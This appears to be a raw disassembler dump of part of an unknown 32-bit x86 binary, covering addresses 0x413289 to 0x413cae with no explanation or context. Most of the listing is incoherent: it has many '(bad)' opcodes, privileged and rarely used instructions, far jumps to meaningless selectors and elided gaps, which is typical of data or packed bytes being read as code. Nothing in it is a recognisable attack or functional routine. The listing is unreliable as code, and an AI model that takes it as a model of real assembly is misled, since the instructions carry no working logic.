  413289:	mov    al,0xe7
  41328b:	inc    esp
  41328c:	in     eax,dx
  41328d:	div    ecx
  41328f:	dec    ebx
  413290:	sbb    ecx,DWORD PTR [edx+0x5fcc0725]
  413296:	loopne 0x4132a6
  413298:	iret   
  413299:	jbe    0x4132b6
  41329b:	inc    eax
  41329c:	test   DWORD PTR [edx-0x77ed4680],edi
  4132a2:	jge    0x4132e7
  4132a4:	ret    
  4132a5:	sar    bh,0x5f
  4132a8:	les    ecx,FWORD PTR [eax-0x7e]
  4132ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4132ac:	add    al,0x55
  4132ae:	mul    BYTE PTR ss:[ecx+eax*4]
  4132b2:	mov    WORD PTR [ecx-0x171f81e0],?
  4132b8:	mov    DWORD PTR [ebx+0x788cdeeb],esi
  4132be:	sar    DWORD PTR [ebx+0x7f0d404e],1
  4132c4:	mov    DWORD PTR [esi],esp
  4132c6:	jno    0x413271
  4132c8:	push   cs
  4132c9:	mov    ecx,0x78329c88
  4132ce:	inc    esp
  4132cf:	and    DWORD PTR [eax+eax*4+0x41e6fb74],edx
  4132d6:	(bad)  
  4132d7:	push   ss
  4132d8:	dec    esi
  4132d9:	push   ebp
  4132da:	pop    es
  4132db:	fcmovb st,st(1)
  4132dd:	mov    edi,0x288a
	...
  4132fe:	cwde   
  4132ff:	mov    bl,0xfb
  413301:	jo     0x413357
  413303:	dec    eax
  413304:	xor    bl,BYTE PTR [ebx]
  413306:	push   ebx
  413307:	ja     0x41335d
  413309:	aad    0x33
  41330b:	ss jnp 0x41332d
  41330e:	sub    ah,BYTE PTR [edx+0x758bee6b]
  413314:	cli    
  413315:	(bad)  
  413316:	iret   
  413317:	icebp  
  413318:	mov    ch,0xea
  41331a:	cmp    DWORD PTR [eax],0x32
  41331d:	fwait
  41331e:	xchg   ebx,eax
  41331f:	and    BYTE PTR [esi],al
  413321:	sub    ebx,DWORD PTR [edx+0x21]
  413324:	mov    ah,BYTE PTR [esi*1-0x7f1518c0]
  41332b:	add    ecx,DWORD PTR [eax]
  41332d:	sub    dl,BYTE PTR [ebp-0x3c9af1b1]
  413333:	cmp    esi,edi
  413335:	xchg   esi,eax
  413336:	dec    edi
  413337:	les    edx,FWORD PTR [ebx]
  413339:	bound  edi,QWORD PTR [ebp+0x100383b]
  41333f:	sbb    BYTE PTR [esi-0x33],bh
  413342:	aas    
  413343:	dec    eax
  413344:	idiv   BYTE PTR [ebx]
  413346:	ins    BYTE PTR es:[edi],dx
  413347:	adc    al,BYTE PTR [ebx+ebx*8-0x7c023dce]
  41334e:	mov    cl,0xef
  413350:	dec    BYTE PTR [eax-0x7bf0e88f]
  413356:	jmp    0x2248:0x2f000016
  41335d:	inc    eax
  41335e:	std    
  41335f:	inc    edi
  413360:	and    dl,BYTE PTR [eax+0x0]
	...
  41337f:	add    ch,bl
  413381:	xchg   edi,eax
  413382:	adc    al,BYTE PTR [eax]
  413384:	mov    es,WORD PTR fs:[esp+ebp*2+0x77]
  413389:	int3   
  41338a:	sub    ebx,eax
  41338c:	mov    ch,0x3e
  41338e:	mov    edi,0x133af00f
  413393:	add    BYTE PTR [ebp+ecx*4+0x1],ah
  413397:	inc    ebx
  413398:	cmp    al,0x4a
  41339a:	dec    DWORD PTR [esi]
  41339c:	mov    ecx,0x43fffa11
  4133a1:	jmp    0x413417
  4133a3:	repz inc ebx
  4133a5:	ror    DWORD PTR [ecx-0x38ca4fba],0x2b
  4133ac:	ja     0x4133f1
  4133ae:	cmp    ecx,eax
  4133b0:	xor    ecx,DWORD PTR [edi+0x3241515]
  4133b6:	movzx  edx,BYTE PTR [edi]
  4133b9:	mov    WORD PTR [eax+esi*1+0x3],es
  4133bd:	mov    ecx,0x187e014d
  4133c2:	add    al,BYTE PTR [ebx-0x4]
  4133c5:	push   ss
  4133c6:	add    ebx,ebp
  4133c8:	xchg   esi,eax
  4133c9:	adc    BYTE PTR [esi-0x49f00ab9],dh
  4133cf:	dec    edi
  4133d0:	test   cl,0xde
  4133d3:	or     BYTE PTR ds:0x48884122,cl
  4133d9:	lea    eax,[esi+eax*8-0x394a6df2]
  4133e0:	dec    eax
  4133e1:	mov    ecx,0x2
	...
  413402:	or     eax,0x4ab60f29
  413407:	sub    BYTE PTR [edi],cl
  413409:	mov    dh,0x42
  41340b:	sub    eax,DWORD PTR [ebx+0x4128a164]
  413411:	fild   WORD PTR ds:0xbf324422
  413417:	test   al,0x3a
  413419:	and    eax,0x8845dd1a
  41341e:	fmul   st,st(4)
  413420:	sub    al,0xd5
  413422:	mov    cs,WORD PTR [ebx+0x3e]
  413425:	dec    DWORD PTR [ebx+0x63]
  413428:	xor    al,BYTE PTR [eax]
  41342a:	or     eax,0x76470229
  41342f:	and    dh,bl
  413431:	mov    edi,0xefc69fcd
  413436:	test   BYTE PTR [ebx+0x3e],ah
  413439:	jmp    0x7a0d:0xfba6a93f
  413440:	inc    edx
  413441:	aas    
  413442:	test   BYTE PTR [ebx+0x32],ch
  413445:	inc    esi
  413446:	es inc ebp
  413448:	lea    eax,[edi+0x2c]
  41344b:	test   eax,0xeb940021
  413450:	das    
  413451:	push   cs
  413452:	pop    ebx
  413453:	mov    al,ds:0x28cd7139
  413458:	movsx  ecx,BYTE PTR [ebp+0xd3fb328]
  41345f:	out    0x8a,al
  413461:	dec    esp
  413462:	stc    
  413463:	mov    al,ds:0xf7c5
	...
  413484:	mov    BYTE PTR [edi-0x4b],ah
  413487:	pop    es
  413488:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413489:	add    BYTE PTR [esi+0x6fbde340],ah
  41348f:	(bad)  
  413490:	loop   0x41349f
  413492:	pop    edi
  413493:	sbb    BYTE PTR [edx+0x36],cl
  413496:	and    ebx,DWORD PTR [esp+ecx*1]
  413499:	xchg   DWORD PTR [ebx],ebx
  41349b:	cmp    BYTE PTR [ebx],dl
  41349d:	test   BYTE PTR [ebx+eax*1-0x2e9dfff3],al
  4134a4:	loop   0x4134b2
  4134a6:	aaa    
  4134a7:	paddb  mm6,mm0
  4134aa:	cmp    cl,BYTE PTR [edx-0x318ecbaf]
  4134b0:	xchg   esi,eax
  4134b1:	ret    0xd65f
  4134b4:	(bad)  
  4134b5:	clc    
  4134b6:	and    bh,BYTE PTR [edi-0xb16d6c7]
  4134bc:	pop    esp
  4134bd:	ret    0xe201
  4134c0:	out    0xc,al
  4134c2:	push   0xffffffde
  4134c4:	push   ds
  4134c5:	add    cl,ch
  4134c7:	adc    BYTE PTR [ebx+0x32d17211],ah
  4134cd:	or     eax,0xc1070f57
  4134d2:	iret   
  4134d3:	into   
  4134d4:	pop    esi
  4134d5:	or     eax,0x3d441464
  4134da:	add    eax,0x7213c940
  4134df:	into   
  4134e0:	mul    DWORD PTR ss:[ebx-0x4ead4ce9]
  4134e7:	dec    ebx
	...
  413504:	add    BYTE PTR [eax],al
  413506:	sbb    eax,DWORD PTR [esi+edi*2+0x693d2331]
  41350d:	shl    DWORD PTR [esi],0x0
  413510:	out    0x88,al
  413512:	les    edx,FWORD PTR [ebx]
  413514:	jmp    0xc51bc91c
  413519:	sti    
  41351a:	retf   0xfcba
  41351d:	mov    WORD PTR [ecx+0x14],cs
  413520:	add    dl,dh
  413522:	shr    BYTE PTR [eax+0x761bd372],1
  413528:	adc    dh,BYTE PTR [edx-0x2d]
  41352b:	in     al,dx
  41352c:	push   cs
  41352d:	push   edi
  41352e:	std    
  41352f:	or     DWORD PTR [ecx],edi
  413531:	and    al,0x15
  413533:	mov    ah,0x24
  413535:	sub    cl,BYTE PTR [edx]
  413537:	les    edx,FWORD PTR [ebx]
  413539:	rcl    ch,0x10
  41353c:	jl     0x4134c8
  41353e:	out    0x16,al
  413540:	mov    ebp,DWORD PTR [edi]
  413542:	int    0x83
  413544:	mov    edi,0x5cf8fff5
  413549:	icebp  
  41354a:	pop    eax
  41354b:	or     dh,BYTE PTR [ebx]
  41354d:	xor    al,dl
  41354f:	xchg   DWORD PTR [ebp-0x4b],ecx
  413552:	xchg   edi,eax
  413553:	aas    
  413554:	push   cs
  413555:	pop    esi
  413556:	xor    edi,DWORD PTR [eax]
  413558:	inc    BYTE PTR [esi-0x72]
  41355b:	mov    ebx,0x830be9ef
  413560:	ds inc esp
  413562:	xor    bh,BYTE PTR [esi]
  413564:	cmp    cl,BYTE PTR [edx+ebp*1+0x49820e]
	...
  413587:	add    BYTE PTR [ecx],ah
  413589:	ds (bad) 
  41358b:	jb     0x4135d1
  41358d:	loopne 0x4135ce
  41358f:	pusha  
  413590:	inc    esp
  413591:	loopne 0x413591
  413593:	xchg   esp,eax
  413594:	xor    cl,BYTE PTR [ecx+0x3d0e93d6]
  41359a:	je     0x413579
  41359c:	xchg   DWORD PTR [ecx-0x2],ecx
  41359f:	jl     0x4135b7
  4135a1:	(bad)  
  4135a2:	(bad)  
  4135a3:	je     0x4135a3
  4135a5:	cmp    al,0x74
  4135a7:	cmc    
  4135a8:	jecxz  0x41355d
  4135aa:	pop    es
  4135ab:	sar    DWORD PTR [eax+ebp*1-0x7cb82902],1
  4135b2:	mov    edi,0x155095de
  4135b7:	add    ah,dh
  4135b9:	(bad)  
  4135ba:	cmp    bl,BYTE PTR [ebp-0x48]
  4135bd:	outs   dx,BYTE PTR ds:[esi]
  4135be:	shr    cl,cl
  4135c0:	dec    esp
  4135c1:	cld    
  4135c2:	std    
  4135c3:	jmp    FWORD PTR [edi+0x50]
  4135c6:	cli    
  4135c7:	(bad)  
  4135c8:	xor    DWORD PTR [eax],ebx
  4135ca:	add    DWORD PTR [eax],eax
  4135cc:	in     al,0xff
  4135ce:	cmp    cl,0xe5
  4135d1:	jnp    0x4135f2
  4135d3:	cmp    edi,edx
  4135d5:	outs   dx,DWORD PTR ds:[esi]
  4135d6:	or     eax,0xfdfd1583
  4135db:	jmp    FWORD PTR [ebx+0x7d4309b5]
  4135e1:	push   eax
  4135e2:	repnz rdtsc 
  4135e5:	ds idiv bh
  4135e8:	sub    edi,edx
  4135ea:	inc    ebx
  4135eb:	adc    al,0x0
	...
  413609:	add    BYTE PTR [edi],bl
  41360b:	push   eax
  41360c:	cli    
  41360d:	cmp    DWORD PTR [ecx+0x13],ebp
  413610:	jle    0x4135f1
  413612:	pop    ds
  413613:	int3   
  413614:	or     eax,0xfdeb3284
  413619:	jmp    edi
  41361b:	aas    
  41361c:	jmp    0xf10f:0x124fed00
  413623:	rcl    DWORD PTR [ecx],1
  413625:	add    BYTE PTR [esp+ecx*4+0x5b],dh
  413629:	cld    
  41362a:	outs   dx,DWORD PTR ds:[esi]
  41362b:	(bad)  
  41362c:	jnp    0x413660
  41362e:	aas    
  41362f:	pop    ebp
  413630:	push   0x73
  413632:	inc    edi
  413633:	or     dh,BYTE PTR [esi-0xdafb2f5]
  413639:	jne    0x41368c
  41363b:	ds std 
  41363d:	inc    ebp
  41363e:	push   eax
  41363f:	cmp    al,0x43
  413641:	adc    al,0xb8
  413643:	call   0x41e05131
  413648:	jp     0x4135cf
  41364a:	fs js  0x41365e
  41364d:	cmp    ecx,DWORD PTR ds:0x1b760bf4
  413653:	push   ss
  413654:	dec    ebx
  413655:	inc    eax
  413656:	xchg   esp,eax
  413657:	repnz fistp QWORD PTR [edx]
  41365a:	int3   
  41365b:	sub    DWORD PTR [ebx+0x3c71f41c],ecx
  413661:	sub    BYTE PTR [eax+0x79],0x3
  413665:	js     0xdb3f6685
  41366b:	sbb    eax,0xfbdd
	...
  41368c:	add    ah,BYTE PTR [edi-0x763509ac]
  413692:	mov    BYTE PTR [ecx+ebp*8-0x18],al
  413696:	mov    al,BYTE PTR [ecx+esi*8-0x47]
  41369a:	mov    dh,0x23
  41369c:	xchg   BYTE PTR [ecx+0x33abffa9],bl
  4136a2:	push   ds
  4136a3:	mov    edx,esi
  4136a5:	mov    eax,ds:0xda4317b6
  4136aa:	mov    dh,0xf
  4136ac:	xchg   edx,eax
  4136ad:	pop    ebx
  4136ae:	push   cs
  4136af:	inc    DWORD PTR [eax]
  4136b1:	and    DWORD PTR [edx],ebp
  4136b3:	or     BYTE PTR [ecx-0x3f],dh
  4136b6:	cmp    al,0x4a
  4136b8:	nop
  4136b9:	call   0x5b46bbca
  4136be:	add    al,BYTE PTR [eax]
  4136c0:	mov    WORD PTR es:[esi],?
  4136c3:	jb     0x4136fe
  4136c5:	setge  dh
  4136c8:	pop    edx
  4136c9:	sbb    ecx,edi
  4136cb:	pop    ebp
  4136cc:	loope  0x4136ef
  4136ce:	jg     0x413676
  4136d0:	inc    ebp
  4136d1:	or     DWORD PTR ds:0xbf2d7b0e,edi
  4136d7:	cmc    
  4136d8:	shl    BYTE PTR [eax],1
  4136da:	add    DWORD PTR [esi+edx*1-0x62],esi
  4136de:	lds    ebp,FWORD PTR [edi]
  4136e0:	sbb    dh,bl
  4136e2:	aam    0x0
  4136e4:	xchg   edi,eax
  4136e5:	push   esp
  4136e7:	or     ecx,DWORD PTR [esi+0x6fbea42]
  4136ed:	(bad)  
  4136ee:	in     eax,0x86
	...
  41370c:	add    BYTE PTR [eax],al
  41370e:	push   ss
  41370f:	sub    al,0xcd
  413711:	cmp    al,0xf5
  413713:	scas   eax,DWORD PTR es:[edi]
  413714:	mov    ebp,0x7709fb3c
  413719:	les    ecx,FWORD PTR ds:0x2601ad7d
  41371f:	aas    
  413720:	shr    DWORD PTR [ecx],0x13
  413723:	jb     0x413752
  413725:	add    ecx,DWORD PTR [edx]
  413727:	jb     0x413756
  413729:	add    cl,ah
  41372b:	and    al,ah
  41372d:	or     ah,cl
  41372f:	xchg   DWORD PTR [ebx],esp
  413731:	inc    eax
  413732:	pop    DWORD PTR [ecx-0x17]
  413735:	sub    dl,BYTE PTR [ecx+0x203e900]
  41373b:	jb     0x41376a
  41373d:	add    ebx,DWORD PTR [edx]
  41373f:	jb     0x413756
  413741:	add    cl,BYTE PTR [esi-0x33fc9b5d]
  413747:	and    al,dh
  413749:	or     bh,cl
  41374b:	in     eax,dx
  41374c:	cmp    al,BYTE PTR [ebx-0x6822127b]
  413752:	dec    esp
  413753:	xchg   DWORD PTR [ebx+0x6956672f],ebx
  413759:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41375a:	jbe    0x41375c
  41375c:	cs (bad) 
  41375e:	jp     0x41375f
  413760:	call   0x12024468
  413765:	xlat   BYTE PTR ds:[ebx]
  413766:	pop    ds
  413767:	inc    eax
  413768:	test   al,0x8a
  41376a:	leave  
  41376b:	das    
  41376c:	pop    edi
  41376d:	mov    BYTE PTR [esi+0x25],0x1a
  413771:	add    BYTE PTR [eax],0x0
	...
  413790:	test   eax,0x7af0e83b
  413795:	shr    BYTE PTR [edi-0x3a],0x22
  413799:	sar    edi,0x1
  41379c:	dec    edi
  41379d:	or     dh,BYTE PTR [esi-0x49f6f05a]
  4137a3:	adc    edi,DWORD PTR ss:[ebp+0x64]
  4137a7:	fisttp QWORD PTR [ecx]
  4137a9:	aas    
  4137aa:	(bad)  
  4137ac:	dec    edi
  4137ad:	(bad)  
  4137ae:	out    dx,eax
  4137af:	call   0xf24137c2
  4137b4:	push   ecx
  4137b5:	es cdq 
  4137b7:	ins    BYTE PTR es:[edi],dx
  4137b8:	ror    DWORD PTR [edx+eax*4-0x38],0x10
  4137bd:	xchg   DWORD PTR [ebp+edi*4+0x16],ecx
  4137c1:	jp     0x41374a
  4137c3:	xchg   ebp,eax
  4137c4:	mov    ds:0x54edfff8,eax
  4137c9:	mov    ecx,0x38d11bf3
  4137ce:	inc    ebp
  4137cf:	pusha  
  4137d0:	aam    0x34
  4137d2:	mov    BYTE PTR [ecx+edi*8],ch
  4137d5:	cmp    DWORD PTR [edi-0x187f90c],0x76
  4137dc:	out    0xb9,al
  4137de:	mov    BYTE PTR [ecx+eiz*8],ah
  4137e1:	or     DWORD PTR [esi+0x4432cffe],esi
  4137e7:	add    DWORD PTR [eax],ecx
  4137e9:	xchg   DWORD PTR [ebp+ebx*2+0x16],edx
  4137ed:	test   bl,ah
  4137ef:	jmp    0xb7cc3802
	...
  413810:	add    BYTE PTR [eax],al
  413812:	jle    0x41381d
  413814:	mov    dh,0xed
  413816:	sbb    ebp,ebp
  413818:	shl    DWORD PTR [eax+0x54],1
  41381b:	sub    al,0x8a
  41381d:	pushf  
  41381e:	sbb    bh,BYTE PTR [edi-0xaf54378]
  413824:	leave  
  413825:	popf   
  413826:	gs and eax,0xbee0da02
  41382c:	cmp    ch,BYTE PTR [edi+0x83096a]
  413832:	jmp    0x11ae:0x23000012
  413839:	mov    esi,DWORD PTR [edx+0x2c]
  41383c:	or     eax,0x430a40b6
  413841:	cmp    ecx,esp
  413843:	out    dx,eax
  413844:	or     eax,0xfdedb084
  413849:	jmp    ebx
  41384b:	inc    eax
  41384c:	adc    cl,BYTE PTR [ebx+0x4d37f821]
  413852:	fdivr  DWORD PTR [ecx-0x2d]
  413855:	cmp    edi,DWORD PTR [edx+ecx*1-0x531007c]
  41385c:	std    
  41385d:	xor    DWORD PTR [ecx],0xffffffe8
  413860:	dec    BYTE PTR [eax-0x7af0efdf]
  413866:	or     cl,BYTE PTR [esi]
  413868:	add    BYTE PTR [eax],al
  41386a:	sub    eax,0x6c3bfa58
  41386f:	js     0x4138a8
  413871:	cmp    esi,edx
  413873:	addr16 jno 0x413890
	...
  413892:	add    BYTE PTR [eax],al
  413894:	mov    ds:0xf28b11b1,eax
  413899:	sub    ecx,DWORD PTR ds:0x3905c0b6
  41389f:	dec    ebp
  4138a0:	cmp    BYTE PTR [edi+0x23],ah
  4138a3:	inc    ebx
  4138a4:	xor    eax,DWORD PTR [eax+0x12]
  4138a7:	cmp    DWORD PTR [ecx-0x301c83f9],edi
  4138ad:	adc    al,0x8b
  4138af:	inc    esi
  4138b0:	push   eax
  4138b1:	cmp    BYTE PTR [esi+0x5b365774],0x8
  4138b8:	stos   BYTE PTR es:[edi],al
  4138b9:	or     DWORD PTR [ebx],esi
  4138bb:	leave  
  4138bc:	mov    ch,0x84
  4138be:	dec    esp
  4138bf:	pop    esp
  4138c0:	outs   dx,DWORD PTR ds:[esi]
  4138c1:	mov    esp,0xf2a38f0d
  4138c6:	std    
  4138c7:	dec    DWORD PTR ds:0xdefb7aa
  4138cd:	push   esi
  4138ce:	jg     0x413877
  4138d0:	daa    
  4138d1:	(bad)  
  4138d2:	cmp    DWORD PTR [edx],edi
  4138d4:	shl    BYTE PTR [eax+ecx*1],1
  4138d7:	adc    BYTE PTR [edi+esi*1],0x38
  4138db:	(bad)  
  4138dc:	xchg   esi,eax
  4138dd:	pop    esp
  4138de:	fidivr WORD PTR [edi]
  4138e0:	test   ah,ah
  4138e2:	(bad)  
  4138e4:	cwde   
  4138e5:	cld    
  4138e6:	mov    esi,ss
  4138e8:	ja     0x413913
  4138ea:	aaa    
  4138eb:	je     0x41390e
  4138ed:	mov    ds:0x2180fe4c,al
  4138f2:	sar    dh,1
  4138f4:	js     0x41394f
  4138f6:	aaa    
  4138f7:	je     0x4138f9
	...
  413915:	add    BYTE PTR [ecx],bl
  413917:	outs   dx,BYTE PTR ds:[esi]
  413918:	scas   al,BYTE PTR es:[edi]
  413919:	pop    es
  41391a:	cmc    
  41391b:	xor    DWORD PTR [esi+edi*8],ebp
  41391e:	fisub  DWORD PTR [ebx+0x21880e43]
  413924:	push   cs
  413925:	add    BYTE PTR ds:0xc15cfce2,cl
  41392b:	sbb    DWORD PTR [eax-0x18],edx
  41392e:	fdiv   QWORD PTR [ebx-0x1c7901c8]
  413934:	aaa    
  413935:	(bad)  
  413936:	push   eax
  413937:	push   ebp
  413938:	add    DWORD PTR [eax],eax
  41393a:	or     eax,0xcf88329
  41393f:	sbb    eax,0x45333ae1
  413944:	pop    es
  413945:	adc    DWORD PTR [edi-0x2a],0x38
  413949:	(bad)  
  41394a:	adc    cl,BYTE PTR [edi+0x6c34430c]
  413950:	cs push cs
  413952:	mov    DWORD PTR [esi+ebp*1-0x41129502],eax
  413959:	adc    edx,DWORD PTR [esi-0x37c7c96d]
  41395f:	(bad)  
  413960:	cld    
  413961:	mov    ecx,0x930fa33
  413966:	xchg   ecx,eax
  413967:	out    0x2,al
  413969:	cmp    DWORD PTR [ebx-0x7e],eax
  41396c:	mov    esp,DWORD PTR [edi]
  41396e:	cmp    al,BYTE PTR [edi+0x7d020fb3]
  413974:	stc    
  413975:	adc    cl,BYTE PTR ds:0xd76000
	...
  413997:	add    BYTE PTR [esi],ah
  413999:	cli    
  41399a:	and    BYTE PTR [edi-0x57b90524],dh
  4139a0:	lahf   
  4139a1:	adc    ch,dh
  4139a3:	jno    0x4139bc
  4139a5:	mul    DWORD PTR [ebx]
  4139a7:	xor    BYTE PTR [esi-0x25],bh
  4139aa:	sub    DWORD PTR [ecx],edi
  4139ac:	push   ecx
  4139ad:	or     al,0x0
  4139af:	mov    edi,0x2cd2b41e
  4139b4:	add    al,0x89
  4139b6:	cs mov eax,0x15344089
  4139bc:	push   ss
  4139bd:	shl    eax,cl
  4139bf:	mov    cl,0x0
  4139c1:	icebp  
  4139c2:	scas   eax,DWORD PTR es:[edi]
  4139c3:	ret    0xc695
  4139c6:	xor    al,0xfd
  4139c8:	int    0x5
  4139ca:	pop    esi
  4139cb:	add    eax,0x31848535
  4139d1:	xor    al,ch
  4139d3:	or     BYTE PTR [eax-0x5cc780ab],dl
  4139d9:	stc    
  4139da:	or     edi,DWORD PTR [eax]
  4139dc:	or     eax,DWORD PTR [edx+0x35932ea8]
  4139e2:	jno    0x4139a2
  4139e4:	rcr    BYTE PTR cs:[edi-0x42],0x2e
  4139e9:	xor    eax,0x4d87dfd3
  4139ee:	rol    BYTE PTR [ebx],cl
  4139f0:	jb     0x41399d
  4139f2:	fmul   QWORD PTR [edi+edx*2+0x6bbff35]
  4139f9:	into   
  4139fa:	(bad)  
  4139fb:	mov    ah,0x0
	...
  413a19:	add    dh,bh
  413a1b:	xor    al,0x74
  413a1d:	cmc    
  413a1e:	adc    eax,0x801107ac
  413a23:	sub    dh,bh
  413a25:	push   ss
  413a26:	ret    
  413a27:	je     0x413a37
  413a29:	adc    BYTE PTR fs:[edx],0x0
  413a2d:	jmp    0xfd9e3473
  413a32:	pop    esi
  413a33:	push   ecx
  413a34:	call   0xfe772e1a
  413a39:	ficomp WORD PTR [ebp+eax*8-0x425f0a00]
  413a40:	add    DWORD PTR [eax-0x5ef502d0],ebp
  413a46:	xchg   esi,eax
  413a47:	aas    
  413a48:	(bad)  
  413a49:	and    al,0x25
  413a4b:	add    BYTE PTR [eax],al
  413a4d:	jmp    0xbd85c160
  413a52:	mov    ?,WORD PTR ds:0x348bc002
  413a58:	(bad)  
  413a59:	jmp    0xe88fa871
  413a5e:	or     ebp,DWORD PTR [esi+0x56]
  413a61:	jmp    0x413ab4
  413a63:	and    BYTE PTR [edi],al
  413a65:	loop   0x413abb
  413a67:	mov    BYTE PTR [ecx+edx*4-0x42],cl
  413a6b:	inc    edi
  413a6c:	xor    ch,BYTE PTR [ecx+0x703ff589]
  413a72:	int3   
  413a73:	cmp    BYTE PTR [esi],cl
  413a75:	pop    ebp
  413a76:	dec    eax
  413a77:	add    dh,0xea
  413a7a:	mov    ebx,eax
  413a7c:	jmp    0x413af0
	...
  413a9a:	add    BYTE PTR [eax],al
  413a9c:	les    ebp,FWORD PTR [edx+ebp*8]
  413a9f:	ror    BYTE PTR [ebx-0x44],1
  413aa2:	out    dx,eax
  413aa3:	call   0x1a413ab6
  413aa8:	rol    DWORD PTR [edi+0x74c80044],1
  413aae:	jmp    0x3f01a205
  413ab3:	mov    DWORD PTR [ecx+0x57f2e9f0],esi
  413ab9:	ret    
  413aba:	aas    
  413abb:	xor    esp,DWORD PTR [ebx+eax*4]
  413abe:	dec    ebx
  413abf:	lock mov ebp,0xf47fa3e
  413ac5:	cmp    ecx,DWORD PTR ds:0xefb9bb6
  413acb:	mov    dh,0x93
  413acd:	inc    al
  413acf:	loope  0x413aed
  413ad1:	xor    DWORD PTR [esi-0xf8e39],edi
  413ad7:	jmp    DWORD PTR [eax+eax*1]
  413ada:	or     ecx,edx
  413adc:	aas    
  413add:	nop
  413ade:	mov    ecx,DWORD PTR [eax-0x4d]
  413ae1:	xchg   BYTE PTR [edi-0x77032b7d],bh
  413ae7:	inc    ebp
  413ae8:	mov    eax,0xec81bdfa
  413aed:	outs   dx,BYTE PTR ds:[esi]
  413aee:	ds add bl,bh
  413af1:	lods   eax,DWORD PTR ds:[esi]
  413af2:	xchg   DWORD PTR [eax],esp
  413af4:	daa    
  413af5:	cmp    al,0xfe
  413af7:	inc    esi
  413af8:	ins    DWORD PTR es:[edi],dx
  413af9:	inc    eax
  413afa:	cli    
  413afb:	mov    DWORD PTR [ecx],ebx
  413afd:	hlt    
  413afe:	or     ecx,0x0
	...
  413b1d:	add    BYTE PTR [ecx],ah
  413b1f:	add    al,0xb9
  413b21:	call   FWORD PTR [ebx+0x19897dea]
  413b27:	hlt    
  413b28:	or     eax,0x8772d3b6
  413b2d:	push   ebp
  413b2e:	and    BYTE PTR [eax-0x6dd5f042],al
  413b34:	add    DWORD PTR [eax],eax
  413b36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b37:	jle    0x413af9
  413b39:	cli    
  413b3a:	daa    
  413b3b:	stc    
  413b3c:	or     eax,0xef6f30f
  413b41:	add    BYTE PTR ds:0xa0233529,cl
  413b47:	push   es
  413b48:	add    eax,DWORD PTR [ecx+0xd]
  413b4b:	ss push eax
  413b4d:	inc    ecx
  413b4e:	es out 0x5,eax
  413b51:	mov    esp,ss
  413b53:	and    eax,0x8c840002
  413b58:	push   cs
  413b59:	jmp    0x413b69
  413b5b:	push   esi
  413b5c:	push   eax
  413b5d:	inc    ecx
  413b5e:	xchg   esi,eax
  413b5f:	arpl   WORD PTR [esi-0x7ee59bc6],sp
  413b65:	dec    ebx
  413b66:	or     ch,BYTE PTR [ecx]
  413b68:	add    al,BYTE PTR [ebx+0x740220b3]
  413b6e:	or     DWORD PTR [edi+0x509bff02],ecx
  413b74:	xchg   DWORD PTR [ebp-0x7],edx
  413b77:	popf   
  413b78:	inc    ecx
  413b79:	out    0x3a,eax
  413b7b:	or     eax,DWORD PTR [eax+eax*1]
  413b7e:	nop
  413b7f:	push   0x8504
	...
  413ba0:	add    al,0x56
  413ba2:	xor    al,0xfe
  413ba4:	xchg   bl,bl
  413ba6:	aaa    
  413ba7:	jmp    0x6f36:0x1bcdae28
  413bae:	clc    
  413baf:	fcomp  DWORD PTR [edx+0x4d]
  413bb2:	mov    BYTE PTR [edx],cl
  413bb4:	pop    ss
  413bb5:	adc    ebp,eax
  413bb7:	je     0x413bb1
  413bb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413bba:	cmp    DWORD PTR [eax],eax
  413bbc:	sbb    bl,BYTE PTR [ebp-0x763d0da8]
  413bc2:	mov    DWORD PTR [edx+0xc],ecx
  413bc5:	dec    edi
  413bc6:	les    ebp,FWORD PTR [edx+eax*1]
  413bc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413bca:	inc    esp
  413bcb:	repnz stos BYTE PTR es:[edi],al
  413bcd:	mov    cl,0x88
  413bcf:	dec    esp
  413bd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413bd1:	in     eax,0x34
  413bd3:	inc    esp
  413bd4:	add    DWORD PTR [eax-0x43],esi
  413bd7:	adc    edx,DWORD PTR [ebx]
  413bd9:	add    BYTE PTR [esi-0x170297d5],al
  413bdf:	add    edx,DWORD PTR [esi+0x4ae8c4c9]
  413be5:	div    BYTE PTR [edx]
  413be7:	add    eax,0x353c3d8a
  413bec:	imul   edi,esi,0x20
  413bef:	sub    edx,DWORD PTR [ebp+edi*8-0x18]
  413bf3:	add    edx,DWORD PTR [edx-0x44]
  413bf6:	aam    0x2
  413bf8:	or     eax,0x4280e900
  413bfd:	add    dh,ch
  413bff:	xchg   DWORD PTR [ebp+edi*8+0x3e8],eax
	...
  413c22:	not    cl
  413c24:	jl     0x413c2a
  413c26:	mov    ds,WORD PTR [ebp-0x4]
  413c29:	xor    al,0x2b
  413c2b:	add    dh,BYTE PTR [edi]
  413c2d:	adc    esi,ecx
  413c2f:	jle    0x413c23
  413c31:	or     DWORD PTR [ecx-0x737a2227],esp
  413c37:	cs in  eax,0x34
  413c3a:	(bad)  
  413c3b:	ss in  al,dx
  413c3d:	mov    ch,0x1d
  413c3f:	jge    0x413c13
  413c41:	push   es
  413c42:	sbb    ebp,0x893967
  413c48:	jmp    0x4cbc5650
  413c4d:	xor    ebx,esp
  413c4f:	xor    DWORD PTR [ecx-0x4b],ebp
  413c52:	cmp    al,BYTE PTR [eax]
  413c54:	fidivr WORD PTR [esi+0x6c]
  413c57:	sub    eax,0xbbcb34a5
  413c5c:	hlt    
  413c5d:	cli    
  413c5e:	dec    ecx
  413c5f:	or     al,0x17
  413c61:	inc    esp
  413c62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c63:	stos   DWORD PTR es:[edi],eax
  413c64:	jmp    0x1fa8:0x26f50d03
  413c6b:	and    ch,BYTE PTR [eax-0x8]
  413c6e:	adc    al,0xab
  413c70:	(bad)  
  413c71:	jg     0x413c40
  413c73:	es in  eax,0xa6
  413c76:	push   ebx
  413c77:	or     eax,0xee901
  413c7c:	and    DWORD PTR [ecx+0xf],0x1
  413c80:	mov    WORD PTR [ecx+0x1200000c],?
	...
  413ca2:	add    BYTE PTR [eax],al
  413ca4:	pop    ebx
  413ca5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ca6:	push   cs
  413ca7:	push   0x4e
  413ca9:	sub    eax,0x6a093efe
  413cae:	adc    ch,BYTE PTR [edx-0x21f7c873]
